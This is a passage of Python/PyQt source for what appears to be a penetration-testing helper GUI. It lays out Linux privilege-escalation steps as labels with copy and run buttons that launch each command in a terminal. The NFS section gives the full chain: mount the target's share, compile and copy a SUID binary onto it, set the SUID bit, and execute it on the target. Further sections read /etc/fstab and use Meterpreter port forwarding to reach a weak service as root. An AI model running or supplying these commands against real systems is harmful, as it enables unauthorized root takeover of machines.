        self.tab3_container_layout.insertWidget(123,self.lpe_NFS_exploitHost)

        # lpe_NFS_exploitHost_Scan1
        if hasattr(self, 'lpe_NFS_exploitHost_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan1)
            self.lpe_NFS_exploitHost_Scan1.deleteLater()
        self.lpe_NFS_exploitHost_Scan1 = QLabel(f"mkdir -p /mnt/nfs/")
        self.lpe_NFS_exploitHost_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_NFS_exploitHost_Scan1 copy button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan1_Copy)
            self.lpe_NFS_exploitHost_Scan1_Copy.deleteLater()
        self.lpe_NFS_exploitHost_Scan1_Copy = QPushButton()
        self.lpe_NFS_exploitHost_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_NFS_exploitHost_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_NFS_exploitHost_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_NFS_exploitHost_Scan1.text()))
        self.lpe_NFS_exploitHost_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan1 run button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan1_Run)
            self.lpe_NFS_exploitHost_Scan1_Run.deleteLater()
        self.lpe_NFS_exploitHost_Scan1_Run = QPushButton()
        self.lpe_NFS_exploitHost_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_NFS_exploitHost_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_NFS_exploitHost_Scan1.text() + "; bash"
        self.lpe_NFS_exploitHost_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_NFS_exploitHost_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan1_Copy)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan1_Run)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan1)
        self.tab3_container_layout.insertLayout(124, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_NFS_exploitHost_Scan2
        if hasattr(self, 'lpe_NFS_exploitHost_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan2)
            self.lpe_NFS_exploitHost_Scan2.deleteLater()
        self.lpe_NFS_exploitHost_Scan2 = QLabel(f"mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock")
        self.lpe_NFS_exploitHost_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_NFS_exploitHost_Scan2 copy button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan2_Copy)
            self.lpe_NFS_exploitHost_Scan2_Copy.deleteLater()
        self.lpe_NFS_exploitHost_Scan2_Copy = QPushButton()
        self.lpe_NFS_exploitHost_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_NFS_exploitHost_Scan2_Copy.setFixedSize(QSize(20,20))
        self.lpe_NFS_exploitHost_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_NFS_exploitHost_Scan2.text()))
        self.lpe_NFS_exploitHost_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan2 run button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan2_Run)
            self.lpe_NFS_exploitHost_Scan2_Run.deleteLater()
        self.lpe_NFS_exploitHost_Scan2_Run = QPushButton()
        self.lpe_NFS_exploitHost_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_NFS_exploitHost_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_NFS_exploitHost_Scan2.text() + "; bash"
        self.lpe_NFS_exploitHost_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_NFS_exploitHost_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan2_Copy)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan2_Run)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan2)
        self.tab3_container_layout.insertLayout(125, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_NFS_exploitHost_Scan3
        if hasattr(self, 'lpe_NFS_exploitHost_Scan3'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan3)
            self.lpe_NFS_exploitHost_Scan3.deleteLater()
        self.lpe_NFS_exploitHost_Scan3 = QLabel(f"gcc suid.c -o suid")
        self.lpe_NFS_exploitHost_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_NFS_exploitHost_Scan3 copy button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan3_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan3_Copy)
            self.lpe_NFS_exploitHost_Scan3_Copy.deleteLater()
        self.lpe_NFS_exploitHost_Scan3_Copy = QPushButton()
        self.lpe_NFS_exploitHost_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_NFS_exploitHost_Scan3_Copy.setFixedSize(QSize(20,20))
        self.lpe_NFS_exploitHost_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_NFS_exploitHost_Scan3.text()))
        self.lpe_NFS_exploitHost_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan3 run button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan3_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan3_Run)
            self.lpe_NFS_exploitHost_Scan3_Run.deleteLater()
        self.lpe_NFS_exploitHost_Scan3_Run = QPushButton()
        self.lpe_NFS_exploitHost_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_NFS_exploitHost_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_NFS_exploitHost_Scan3.text() + "; bash"
        self.lpe_NFS_exploitHost_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_NFS_exploitHost_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan3_Copy)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan3_Run)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan3)
        self.tab3_container_layout.insertLayout(126, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_NFS_exploitHost_Scan4
        if hasattr(self, 'lpe_NFS_exploitHost_Scan4'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan4)
            self.lpe_NFS_exploitHost_Scan4.deleteLater()
        self.lpe_NFS_exploitHost_Scan4 = QLabel(f"cp suid /mnt/nfs/")
        self.lpe_NFS_exploitHost_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_NFS_exploitHost_Scan4 copy button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan4_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan4_Copy)
            self.lpe_NFS_exploitHost_Scan4_Copy.deleteLater()
        self.lpe_NFS_exploitHost_Scan4_Copy = QPushButton()
        self.lpe_NFS_exploitHost_Scan4_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_NFS_exploitHost_Scan4_Copy.setFixedSize(QSize(20,20))
        self.lpe_NFS_exploitHost_Scan4_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_NFS_exploitHost_Scan4.text()))
        self.lpe_NFS_exploitHost_Scan4_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan4 run button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan4_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan4_Run)
            self.lpe_NFS_exploitHost_Scan4_Run.deleteLater()
        self.lpe_NFS_exploitHost_Scan4_Run = QPushButton()
        self.lpe_NFS_exploitHost_Scan4_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_NFS_exploitHost_Scan4_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_NFS_exploitHost_Scan4.text() + "; bash"
        self.lpe_NFS_exploitHost_Scan4_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_NFS_exploitHost_Scan4_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan4_Copy)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan4_Run)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan4)
        self.tab3_container_layout.insertLayout(127, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_NFS_exploitHost_Scan5
        if hasattr(self, 'lpe_NFS_exploitHost_Scan5'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan5)
            self.lpe_NFS_exploitHost_Scan5.deleteLater()
        self.lpe_NFS_exploitHost_Scan5 = QLabel(f"chmod u+s /mnt/nfs/suid")
        self.lpe_NFS_exploitHost_Scan5.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_NFS_exploitHost_Scan5 copy button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan5_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan5_Copy)
            self.lpe_NFS_exploitHost_Scan5_Copy.deleteLater()
        self.lpe_NFS_exploitHost_Scan5_Copy = QPushButton()
        self.lpe_NFS_exploitHost_Scan5_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_NFS_exploitHost_Scan5_Copy.setFixedSize(QSize(20,20))
        self.lpe_NFS_exploitHost_Scan5_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_NFS_exploitHost_Scan5.text()))
        self.lpe_NFS_exploitHost_Scan5_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan5 run button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan5_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan5_Run)
            self.lpe_NFS_exploitHost_Scan5_Run.deleteLater()
        self.lpe_NFS_exploitHost_Scan5_Run = QPushButton()
        self.lpe_NFS_exploitHost_Scan5_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_NFS_exploitHost_Scan5_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_NFS_exploitHost_Scan5.text() + "; bash"
        self.lpe_NFS_exploitHost_Scan5_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_NFS_exploitHost_Scan5_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan5 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan5_Copy)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan5_Run)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan5)
        self.tab3_container_layout.insertLayout(128, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_NFS_exploitHost_Scan6
        if hasattr(self, 'lpe_NFS_exploitHost_Scan6'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan6)
            self.lpe_NFS_exploitHost_Scan6.deleteLater()
        self.lpe_NFS_exploitHost_Scan6 = QLabel(f"su <user id matching target machine's user-level privilege.>")
        self.lpe_NFS_exploitHost_Scan6.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_NFS_exploitHost_Scan6 copy button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan6_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan6_Copy)
            self.lpe_NFS_exploitHost_Scan6_Copy.deleteLater()
        self.lpe_NFS_exploitHost_Scan6_Copy = QPushButton()
        self.lpe_NFS_exploitHost_Scan6_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_NFS_exploitHost_Scan6_Copy.setFixedSize(QSize(20,20))
        self.lpe_NFS_exploitHost_Scan6_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_NFS_exploitHost_Scan6.text()))
        self.lpe_NFS_exploitHost_Scan6_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan6 run button
        if hasattr(self, 'lpe_NFS_exploitHost_Scan6_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitHost_Scan6_Run)
            self.lpe_NFS_exploitHost_Scan6_Run.deleteLater()
        self.lpe_NFS_exploitHost_Scan6_Run = QPushButton()
        self.lpe_NFS_exploitHost_Scan6_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_NFS_exploitHost_Scan6_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_NFS_exploitHost_Scan6.text() + "; bash"
        self.lpe_NFS_exploitHost_Scan6_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_NFS_exploitHost_Scan6_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitHost_Scan6 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan6_Copy)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan6_Run)
        label_layout.addWidget(self.lpe_NFS_exploitHost_Scan6)
        self.tab3_container_layout.insertLayout(129, label_layout)
        self.tab3_container_layout.addStretch()

	# lpe_nfs_eh_spacer1
        if hasattr(self, 'lpe_nfs_eh_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_nfs_eh_spacer1)
            self.lpe_nfs_eh_spacer1.deleteLater()
        self.lpe_nfs_eh_spacer1 = QLabel()
        self.lpe_nfs_eh_spacer1.setFixedWidth(40)
        self.lpe_nfs_eh_spacer1.setFixedHeight(50)

        # lpe_nfs_eh_spacer & divider layout
        self.tab3_container_layout.insertWidget(130, self.lpe_nfs_eh_spacer1)
        self.tab3_container_layout.addStretch()

# lpe_NFS_exploitTarget
        if hasattr(self, 'lpe_NFS_exploitTarget'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitTarget)
            self.lpe_NFS_exploitTarget.deleteLater()
        self.lpe_NFS_exploitTarget = QLabel("[On Target Machine]")
        self.lpe_NFS_exploitTarget.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(131,self.lpe_NFS_exploitTarget)

        # lpe_NFS_exploitTarget_Scan1
        if hasattr(self, 'lpe_NFS_exploitTarget_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitTarget_Scan1)
            self.lpe_NFS_exploitTarget_Scan1.deleteLater()
        self.lpe_NFS_exploitTarget_Scan1 = QLabel(f"./suid")
        self.lpe_NFS_exploitTarget_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_NFS_exploitTarget_Scan1 copy button
        if hasattr(self, 'lpe_NFS_exploitTarget_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitTarget_Scan1_Copy)
            self.lpe_NFS_exploitTarget_Scan1_Copy.deleteLater()
        self.lpe_NFS_exploitTarget_Scan1_Copy = QPushButton()
        self.lpe_NFS_exploitTarget_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_NFS_exploitTarget_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_NFS_exploitTarget_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_NFS_exploitTarget_Scan1.text()))
        self.lpe_NFS_exploitTarget_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitTarget_Scan1 run button
        if hasattr(self, 'lpe_NFS_exploitTarget_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_exploitTarget_Scan1_Run)
            self.lpe_NFS_exploitTarget_Scan1_Run.deleteLater()
        self.lpe_NFS_exploitTarget_Scan1_Run = QPushButton()
        self.lpe_NFS_exploitTarget_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_NFS_exploitTarget_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_NFS_exploitTarget_Scan1.text() + "; bash"
        self.lpe_NFS_exploitTarget_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_NFS_exploitTarget_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_NFS_exploitTarget_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_NFS_exploitTarget_Scan1_Copy)
        label_layout.addWidget(self.lpe_NFS_exploitTarget_Scan1_Run)
        label_layout.addWidget(self.lpe_NFS_exploitTarget_Scan1)
        self.tab3_container_layout.insertLayout(132, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_NFS_divider 1
        if hasattr(self, 'lpe_NFS_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_divider1)
            self.lpe_NFS_divider1.deleteLater()
        self.lpe_NFS_divider1 = QFrame()
        self.lpe_NFS_divider1.setFrameShape(QFrame.HLine)
        self.lpe_NFS_divider1.setLineWidth(3)
        self.lpe_NFS_divider1.setStyleSheet("color: #20C20E;")

        # lpe_NFS_divider2
        if hasattr(self, 'lpe_NFS_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_divider2)
            self.lpe_NFS_divider2.deleteLater()
        self.lpe_NFS_divider2 = QFrame()
        self.lpe_NFS_divider2.setFrameShape(QFrame.HLine)
        self.lpe_NFS_divider2.setLineWidth(3)
        self.lpe_NFS_divider2.setStyleSheet("color: #20C20E;")

        # lpe_NFS_spacer1
        if hasattr(self, 'lpe_NFS_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_spacer1)
            self.lpe_NFS_spacer1.deleteLater()
        self.lpe_NFS_spacer1 = QLabel()
        self.lpe_NFS_spacer1.setFixedWidth(40)
        self.lpe_NFS_spacer1.setFixedHeight(50)

        # lpe_NFS_spacer2
        if hasattr(self, 'lpe_NFS_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_NFS_spacer2)
            self.lpe_NFS_spacer2.deleteLater()
        self.lpe_NFS_spacer2 = QLabel()
        self.lpe_NFS_spacer2.setFixedWidth(40)
        self.lpe_NFS_spacer2.setFixedHeight(50)

        # lpe_NFS_spacer & divider layout
        self.tab3_container_layout.insertWidget(133, self.lpe_NFS_spacer1)
        self.tab3_container_layout.insertWidget(134, self.lpe_NFS_divider1)
        self.tab3_container_layout.insertWidget(135, self.lpe_NFS_divider2)
        self.tab3_container_layout.insertWidget(136, self.lpe_NFS_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_Mounts
        if hasattr(self, 'lpe_Mounts'):
            self.tab3_container_layout.removeWidget(self.lpe_Mounts)
            self.lpe_Mounts.deleteLater()
        self.lpe_Mounts = QLabel("[Any exotic file system mounts/extended attributes?]")
        self.lpe_Mounts.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(137,self.lpe_Mounts)

        # lpe_Mounts_Scan1
        if hasattr(self, 'lpe_Mounts_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_Mounts_Scan1)
            self.lpe_Mounts_Scan1.deleteLater()
        self.lpe_Mounts_Scan1 = QLabel(f"cat /etc/fstab")
        self.lpe_Mounts_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_Mounts_Scan1 copy button
        if hasattr(self, 'lpe_Mounts_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_Mounts_Scan1_Copy)
            self.lpe_Mounts_Scan1_Copy.deleteLater()
        self.lpe_Mounts_Scan1_Copy = QPushButton()
        self.lpe_Mounts_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_Mounts_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_Mounts_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_Mounts_Scan1.text()))
        self.lpe_Mounts_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_Mounts_Scan1 run button
        if hasattr(self, 'lpe_Mounts_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_Mounts_Scan1_Run)
            self.lpe_Mounts_Scan1_Run.deleteLater()
        self.lpe_Mounts_Scan1_Run = QPushButton()
        self.lpe_Mounts_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_Mounts_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_Mounts_Scan1.text() + "; bash"
        self.lpe_Mounts_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_Mounts_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_Mounts_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_Mounts_Scan1_Copy)
        label_layout.addWidget(self.lpe_Mounts_Scan1_Run)
        label_layout.addWidget(self.lpe_Mounts_Scan1)
        self.tab3_container_layout.insertLayout(138, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_Mounts_divider 1
        if hasattr(self, 'lpe_Mounts_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_Mounts_divider1)
            self.lpe_Mounts_divider1.deleteLater()
        self.lpe_Mounts_divider1 = QFrame()
        self.lpe_Mounts_divider1.setFrameShape(QFrame.HLine)
        self.lpe_Mounts_divider1.setLineWidth(3)
        self.lpe_Mounts_divider1.setStyleSheet("color: #20C20E;")

        # lpe_Mounts_divider2
        if hasattr(self, 'lpe_Mounts_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_Mounts_divider2)
            self.lpe_Mounts_divider2.deleteLater()
        self.lpe_Mounts_divider2 = QFrame()
        self.lpe_Mounts_divider2.setFrameShape(QFrame.HLine)
        self.lpe_Mounts_divider2.setLineWidth(3)
        self.lpe_Mounts_divider2.setStyleSheet("color: #20C20E;")

        # lpe_Mounts_spacer1
        if hasattr(self, 'lpe_Mounts_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_Mounts_spacer1)
            self.lpe_Mounts_spacer1.deleteLater()
        self.lpe_Mounts_spacer1 = QLabel()
        self.lpe_Mounts_spacer1.setFixedWidth(40)
        self.lpe_Mounts_spacer1.setFixedHeight(50)

        # lpe_Mounts_spacer2
        if hasattr(self, 'lpe_Mounts_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_Mounts_spacer2)
            self.lpe_Mounts_spacer2.deleteLater()
        self.lpe_Mounts_spacer2 = QLabel()
        self.lpe_Mounts_spacer2.setFixedWidth(40)
        self.lpe_Mounts_spacer2.setFixedHeight(50)

        # lpe_Mounts_spacer & divider layout
        self.tab3_container_layout.insertWidget(139, self.lpe_Mounts_spacer1)
        self.tab3_container_layout.insertWidget(140, self.lpe_Mounts_divider1)
        self.tab3_container_layout.insertWidget(141, self.lpe_Mounts_divider2)
        self.tab3_container_layout.insertWidget(142, self.lpe_Mounts_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_MeterpreterForwarding
        if hasattr(self, 'lpe_MeterpreterForwarding'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding)
            self.lpe_MeterpreterForwarding.deleteLater()
        self.lpe_MeterpreterForwarding = QLabel("[+ Forwarding out a weak service for root priv (with meterpreter!):]")
        self.lpe_MeterpreterForwarding.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(143,self.lpe_MeterpreterForwarding)

        # lpe_MeterpreterForwarding_Scan1
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan1)
            self.lpe_MeterpreterForwarding_Scan1.deleteLater()
        self.lpe_MeterpreterForwarding_Scan1 = QLabel("portfwd add –l 139 –p 139 –r " + self.rhost)
        self.lpe_MeterpreterForwarding_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_MeterpreterForwarding_Scan1 copy button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan1_Copy)
            self.lpe_MeterpreterForwarding_Scan1_Copy.deleteLater()
        self.lpe_MeterpreterForwarding_Scan1_Copy = QPushButton()
        self.lpe_MeterpreterForwarding_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_MeterpreterForwarding_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_MeterpreterForwarding_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_MeterpreterForwarding_Scan1.text()))
        self.lpe_MeterpreterForwarding_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan1 run button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan1_Run)
            self.lpe_MeterpreterForwarding_Scan1_Run.deleteLater()
        self.lpe_MeterpreterForwarding_Scan1_Run = QPushButton()
        self.lpe_MeterpreterForwarding_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_MeterpreterForwarding_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_MeterpreterForwarding_Scan1.text() + "; bash"
        self.lpe_MeterpreterForwarding_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_MeterpreterForwarding_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan1_Copy)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan1_Run)
        label_layout.addWidget(self.lpe_MeterpreterForwarding_Scan1)
        self.tab3_container_layout.insertLayout(144, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_MeterpreterForwarding_Scan2
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan2)
            self.lpe_MeterpreterForwarding_Scan2.deleteLater()
        self.lpe_MeterpreterForwarding_Scan2 = QLabel("background")
        self.lpe_MeterpreterForwarding_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_MeterpreterForwarding_Scan2 copy button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan2_Copy)
            self.lpe_MeterpreterForwarding_Scan2_Copy.deleteLater()
        self.lpe_MeterpreterForwarding_Scan2_Copy = QPushButton()
        self.lpe_MeterpreterForwarding_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_MeterpreterForwarding_Scan2_Copy.setFixedSize(QSize(20,20))
        self.lpe_MeterpreterForwarding_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_MeterpreterForwarding_Scan2.text()))
        self.lpe_MeterpreterForwarding_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_MeterpreterForwarding_Scan2 run button
        if hasattr(self, 'lpe_MeterpreterForwarding_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_MeterpreterForwarding_Scan2_Run)
            self.lpe_MeterpreterForwarding_Scan2_Run.deleteLater()
        self.lpe_MeterpreterForwarding_Scan2_Run = QPushButton()
        self.lpe_MeterpreterForwarding_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
